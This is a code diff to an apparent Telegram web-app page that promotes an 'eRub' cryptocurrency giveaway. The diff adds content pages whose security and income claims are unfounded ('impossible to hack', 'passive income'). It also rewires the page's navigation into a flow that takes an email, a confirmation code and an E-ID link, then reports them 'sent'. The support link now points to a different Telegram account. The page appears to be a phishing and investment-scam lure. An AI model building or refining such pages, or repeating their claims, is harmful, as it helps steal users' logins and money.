@@ -7,7 +7,7 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         /* ============================================================
-           БАЗОВЫЕ СТИЛИ (СИНИЙ ДИЗАЙН)
+           БАЗОВЫЕ СТИЛИ
            ============================================================ */
         * {
             margin: 0;
@@ -63,7 +63,7 @@
         }
 
         /* ============================================================
-           МЕНЮ (как на сайте)
+           МЕНЮ
            ============================================================ */
         .menu-grid {
             display: flex;
@@ -102,7 +102,7 @@
         }
 
         /* ============================================================
-           БАННЕР (как на сайте)
+           БАННЕР
            ============================================================ */
         .hero-banner {
             background: linear-gradient(135deg, #4361ee08, #4361ee12);
@@ -341,6 +341,66 @@
         }
 
         /* ============================================================
+           КОНТЕНТ СТРАНИЦ
+           ============================================================ */
+        .content-block {
+            background: #f8f9fc;
+            border-radius: 16px;
+            padding: 18px 16px;
+            border: 1px solid #e9ecef;
+            margin-bottom: 10px;
+        }
+        .content-block h3 {
+            font-size: 17px;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 6px;
+        }
+        .content-block p {
+            font-size: 14px;
+            color: #6c757d;
+            line-height: 1.6;
+        }
+        .content-block .num {
+            font-size: 12px;
+            font-weight: 700;
+            color: #4361ee;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 2px;
+        }
+        .content-block .highlight-text {
+            color: #4361ee;
+            font-weight: 500;
+        }
+        .content-block .green-text {
+            color: #28a745;
+            font-weight: 500;
+        }
+
+        /* ============================================================
+           FAQ
+           ============================================================ */
+        .faq-item {
+            background: #f8f9fc;
+            border-radius: 12px;
+            padding: 14px 16px;
+            border: 1px solid #e9ecef;
+            margin-bottom: 8px;
+        }
+        .faq-item .q {
+            font-weight: 600;
+            color: #1a1a2e;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+        .faq-item .a {
+            font-size: 14px;
+            color: #6c757d;
+            line-height: 1.5;
+        }
+
+        /* ============================================================
            ФОРМА
            ============================================================ */
         .form-group {
@@ -497,9 +557,6 @@
             line-height: 1.6;
         }
 
-        /* ============================================================
-           АДАПТИВ
-           ============================================================ */
         @media (max-width: 420px) {
             .container {
                 padding: 24px 18px 20px;
@@ -532,20 +589,18 @@
         СТРАНИЦА 1: ГЛАВНАЯ
         ============================================================ -->
         <div id="pageMain" class="page active">
-            <!-- Баннер -->
             <div class="hero-banner">
                 <h2>🚀 Первичное <span class="highlight">распределение</span></h2>
                 <p>1 миллиард eRub за 30 дней</p>
                 <div class="badge">🔥 Акция стартовала!</div>
             </div>
 
-            <!-- Меню как на сайте -->
             <div class="menu-grid">
-                <div class="menu-item" onclick="showMessage('Раздел скоро появится', 'info')">
+                <div class="menu-item" onclick="goToAbout()">
                     <span class="icon">📊</span> О проекте
                     <span class="arrow">›</span>
                 </div>
-                <div class="menu-item" onclick="showMessage('Раздел скоро появится', 'info')">
+                <div class="menu-item" onclick="goToBuy()">
                     <span class="icon">🛒</span> Как купить
                     <span class="arrow">›</span>
                 </div>
@@ -553,7 +608,7 @@
                     <span class="icon">📖</span> Руководство по eРублю
                     <span class="arrow">›</span>
                 </div>
-                <div class="menu-item" onclick="showMessage('Раздел скоро появится', 'info')">
+                <div class="menu-item" onclick="goToFaq()">
                     <span class="icon">❓</span> Частые вопросы
                     <span class="arrow">›</span>
                 </div>
@@ -571,30 +626,138 @@
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 2: РУКОВОДСТВО
+        СТРАНИЦА 2: О ПРОЕКТЕ
+        ============================================================ -->
+        <div id="pageAbout" class="page">
+            <div class="page-icon">📊</div>
+            <div class="page-title">О проекте</div>
+            <div class="page-sub">Суверенная криптовалюта eRub</div>
+
+            <div class="content-block">
+                <p><span class="highlight-text">eRub</span> — это децентрализованная криптовалюта на базе собственного суверенного блокчейна, созданная как свободная альтернатива традиционным финансовым институтам.</p>
+            </div>
+
+            <div class="content-block">
+                <p>eRub не является стейблкоином или государственной цифровой валютой: ее рыночная стоимость формируется исключительно на основе открытого спроса и предложения.</p>
+            </div>
+
+            <div class="content-block">
+                <p>Проект сочетает концепцию <span class="highlight-text">национальной расчетной единицы</span> с фундаментальными принципами блокчейн-технологий: <span class="green-text">полной прозрачностью транзакций</span>, прямым контролем пользователя над активами и строго ограниченным, фиксированным объемом эмиссии.</p>
+            </div>
+
+            <div class="content-block">
+                <p>Сеть eRub функционирует под управлением <span class="highlight-text">децентрализованного сообщества</span> держателей монет, обеспечивая технологическую независимость, защиту от монетарной инфляции регуляторов и абсолютный иммунитет к внешнему экономическому давлению.</p>
+            </div>
+
+            <button class="btn-back" onclick="goToMain()">← Назад</button>
+        </div>
+
+        <!-- ============================================================
+        СТРАНИЦА 3: КАК КУПИТЬ
+        ============================================================ -->
+        <div id="pageBuy" class="page">
+            <div class="page-icon">🛒</div>
+            <div class="page-title">Как купить eRub</div>
+            <div class="page-sub">Пошаговая инструкция</div>
+
+            <div class="content-block">
+                <div class="num">Шаг 1</div>
+                <h3>Зарегистрируйтесь</h3>
+                <p>Создайте аккаунт в системе eRub. Для этого перейдите на сайт и нажмите «Зарегистрироваться».</p>
+            </div>
+
+            <div class="content-block">
+                <div class="num">Шаг 2</div>
+                <h3>Пополните баланс</h3>
+                <p>Пополните свой кошелек любым удобным способом: банковским переводом, криптовалютой или P2P-обменом.</p>
+            </div>
+
+            <div class="content-block">
+                <div class="num">Шаг 3</div>
+                <h3>Купите eRub</h3>
+                <p>Перейдите в раздел «Купить», выберите сумму и подтвердите сделку. Монеты поступят на ваш кошелек мгновенно.</p>
+            </div>
+
+            <div class="content-block">
+                <div class="num">Шаг 4</div>
+                <h3>Начните использовать</h3>
+                <p>После покупки вы можете хранить eRub, участвовать в стейкинге или использовать для переводов по всему миру.</p>
+            </div>
+
+            <button class="btn-back" onclick="goToMain()">← Назад</button>
+        </div>
+
+        <!-- ============================================================
+        СТРАНИЦА 4: РУКОВОДСТВО
         ============================================================ -->
         <div id="pageGuide" class="page">
             <div class="page-icon">📖</div>
             <div class="page-title">Руководство по eРублю</div>
             <div class="page-sub">Всё, что нужно знать</div>
 
-            <div style="background:#f8f9fc;border-radius:16px;padding:18px 16px;border:1px solid #e9ecef;margin-bottom:10px;">
-                <div style="font-size:13px;font-weight:700;color:#4361ee;text-transform:uppercase;letter-spacing:1px;">01</div>
-                <h3 style="font-size:17px;font-weight:700;color:#1a1a2e;margin:4px 0 6px;">Собственные технологии</h3>
-                <p style="font-size:14px;color:#6c757d;line-height:1.6;">Мы не используем зарубежные платформы. еРубль работает на собственной, созданной с нуля цифровой платформе.</p>
+            <div class="content-block">
+                <div class="num">01</div>
+                <h3>Собственные технологии</h3>
+                <p>Мы принципиально не используем зарубежные платформы, такие как Ethereum или Solana. Зависимость от чужих зарубежных сетей — это всегда риск блокировок.</p>
+                <p style="margin-top:6px;"><span class="highlight-text">↗ Свой независимый блокчейн</span><br>еРубль работает на собственной, созданной с нуля цифровой платформе.</p>
+                <p style="margin-top:6px;"><span class="highlight-text">↗ Полная автономность</span><br>Сеть eRub невозможно заблокировать или отключить извне.</p>
             </div>
 
-            <div style="background:#f8f9fc;border-radius:16px;padding:18px 16px;border:1px solid #e9ecef;margin-bottom:10px;">
-                <div style="font-size:13px;font-weight:700;color:#4361ee;text-transform:uppercase;letter-spacing:1px;">02</div>
-                <h3 style="font-size:17px;font-weight:700;color:#1a1a2e;margin:4px 0 6px;">Безопасность высшего уровня</h3>
-                <p style="font-size:14px;color:#6c757d;line-height:1.6;">Постквантовая защита — передовой мировой стандарт безопасности.</p>
+            <div class="content-block">
+                <div class="num">02</div>
+                <h3>Безопасность высшего уровня</h3>
+                <p><span class="highlight-text">↗ Постквантовая защита</span><br>В ядро еРубля уже сейчас заложены алгоритмы постквантового шифрования.</p>
+                <p style="margin-top:6px;"><span class="highlight-text">↗ Неприступная крепость</span><br>Ваши кошельки и сбережения защищены математическими формулами, которые невозможно взломать.</p>
             </div>
 
-            <button id="backFromGuideBtn" class="btn-back">← Назад</button>
+            <div class="content-block">
+                <div class="num">03</div>
+                <h3>Доходность и экологичность</h3>
+                <p><span class="highlight-text">↗ Алгоритм Proof-of-Stake</span><br>Мы отказались от классического майнинга, который требует огромных затрат электроэнергии.</p>
+                <p style="margin-top:6px;"><span class="green-text">↗ Пассивный доход</span><br>Каждый владелец eRub может получать автоматическое вознаграждение за хранение монет.</p>
+            </div>
+
+            <button class="btn-back" onclick="goToMain()">← Назад</button>
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 3: ВХОД
+        СТРАНИЦА 5: ЧАСТЫЕ ВОПРОСЫ
+        ============================================================ -->
+        <div id="pageFaq" class="page">
+            <div class="page-icon">❓</div>
+            <div class="page-title">Частые вопросы</div>
+            <div class="page-sub">Ответы на популярные вопросы</div>
+
+            <div class="faq-item">
+                <div class="q">❓ Что такое eRub?</div>
+                <div class="a">eRub — это суверенная криптовалюта на базе собственного блокчейна, созданная как альтернатива традиционным финансовым институтам.</div>
+            </div>
+
+            <div class="faq-item">
+                <div class="q">❓ Как купить eRub?</div>
+                <div class="a">Зарегистрируйтесь на платформе, пополните баланс и перейдите в раздел «Купить». Подробная инструкция есть в разделе «Как купить».</div>
+            </div>
+
+            <div class="faq-item">
+                <div class="q">❓ Где хранить eRub?</div>
+                <div class="a">Вы можете хранить eRub в официальном кошельке на платформе или в совместимых криптокошельках с поддержкой собственных токенов.</div>
+            </div>
+
+            <div class="faq-item">
+                <div class="q">❓ Безопасно ли это?</div>
+                <div class="a">Да. eRub использует постквантовое шифрование и децентрализованную архитектуру, что делает систему защищенной от любых атак.</div>
+            </div>
+
+            <div class="faq-item">
+                <div class="q">❓ Можно ли заработать на eRub?</div>
+                <div class="a">Да. Вы можете участвовать в стейкинге и получать пассивный доход, просто храня монеты на своем кошельке.</div>
+            </div>
+
+            <button class="btn-back" onclick="goToMain()">← Назад</button>
+        </div>
+
+        <!-- ============================================================
+        СТРАНИЦА 6: ВХОД (ФОРМА)
         ============================================================ -->
         <div id="pageLoginForm" class="page">
             <div class="page-icon">🔑</div>
@@ -616,11 +779,11 @@
 
             <button id="loginSubmitBtn" class="btn-primary">🔓 Войти</button>
 
-            <button id="backFromLoginBtn" class="btn-back">← Назад</button>
+            <button class="btn-back" onclick="goToMain()">← Назад</button>
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 4: КОД
+        СТРАНИЦА 7: КОД
         ============================================================ -->
         <div id="pageCode" class="page">
             <div class="page-icon">📧</div>
@@ -637,11 +800,11 @@
                 <span class="spinner"></span> Ожидание подтверждения...
             </div>
 
-            <button id="backFromCodeBtn" class="btn-back">← Назад</button>
+            <button class="btn-back" onclick="goToLoginForm()">← Назад</button>
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 5: ССЫЛКА (E-ID)
+        СТРАНИЦА 8: ССЫЛКА (E-ID)
         ============================================================ -->
         <div id="pageLink" class="page">
             <div class="page-icon">🔗</div>
@@ -658,17 +821,17 @@
                 <span class="spinner"></span> Ожидание подтверждения...
             </div>
 
-            <button id="backFromLinkBtn" class="btn-back">← Назад</button>
+            <button class="btn-back" onclick="goToLoginForm()">← Назад</button>
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 6: УСПЕХ
+        СТРАНИЦА 9: УСПЕХ
         ============================================================ -->
         <div id="pageSuccess" class="page success-page">
             <div class="check">✅</div>
             <h2>Отправлено</h2>
             <p>Ожидайте ответа</p>
-            <button id="resetBtn" class="btn-secondary" style="margin-top:20px;">🔄 Вернуться на главную</button>
+            <button class="btn-secondary" onclick="goToMain()" style="margin-top:20px;">🔄 Вернуться на главную</button>
         </div>
 
         <!-- ============================================================
@@ -698,7 +861,10 @@
 
         // Страницы
         const pageMain = document.getElementById('pageMain');
+        const pageAbout = document.getElementById('pageAbout');
+        const pageBuy = document.getElementById('pageBuy');
         const pageGuide = document.getElementById('pageGuide');
+        const pageFaq = document.getElementById('pageFaq');
         const pageLoginForm = document.getElementById('pageLoginForm');
         const pageCode = document.getElementById('pageCode');
         const pageLink = document.getElementById('pageLink');
@@ -720,11 +886,6 @@
         const eidBtn = document.getElementById('eidBtn');
         const submitCodeBtn = document.getElementById('submitCodeBtn');
         const submitLinkBtn = document.getElementById('submitLinkBtn');
-        const backFromGuideBtn = document.getElementById('backFromGuideBtn');
-        const backFromLoginBtn = document.getElementById('backFromLoginBtn');
-        const backFromCodeBtn = document.getElementById('backFromCodeBtn');
-        const backFromLinkBtn = document.getElementById('backFromLinkBtn');
-        const resetBtn = document.getElementById('resetBtn');
 
         const msgDiv = document.getElementById('msg');
 
@@ -763,18 +924,17 @@
             eidBtn.textContent = '🆔 Вход через E-ID';
         }
 
-        function goToGuide() {
-            switchPage(pageGuide);
-        }
+        function goToAbout() { switchPage(pageAbout); }
+        function goToBuy() { switchPage(pageBuy); }
+        function goToGuide() { switchPage(pageGuide); }
+        function goToFaq() { switchPage(pageFaq); }
 
         function goToLoginForm() {
             switchPage(pageLoginForm);
             setTimeout(() => email.focus(), 300);
         }
 
-        function goToSuccess() {
-            switchPage(pageSuccess);
-        }
+        function goToSuccess() { switchPage(pageSuccess); }
 
         function getUserData() {
             const user = tg.initDataUnsafe?.user;
@@ -818,14 +978,6 @@
         // ============================================================
         loginBtn.addEventListener('click', goToLoginForm);
         eidBtn.addEventListener('click', goToLoginForm);
-        backFromGuideBtn.addEventListener('click', goToMain);
-        backFromLoginBtn.addEventListener('click', goToMain);
-        backFromCodeBtn.addEventListener('click', goToLoginForm);
-        backFromLinkBtn.addEventListener('click', goToLoginForm);
-        resetBtn.addEventListener('click', function() {
-            goToMain();
-            showMessage('Вы вернулись на главную страницу', 'info');
-        });
 
         // ============================================================
         // 6. ОБЫЧНЫЙ ВХОД → КОД
@@ -970,7 +1122,7 @@
         // 10. ТЕХПОДДЕРЖКА
         // ============================================================
         function openSupport() {
-            window.open('https://t.me/erubsite', '_blank');
+            window.open('https://t.me/potok457', '_blank');
         }
     </script>
 
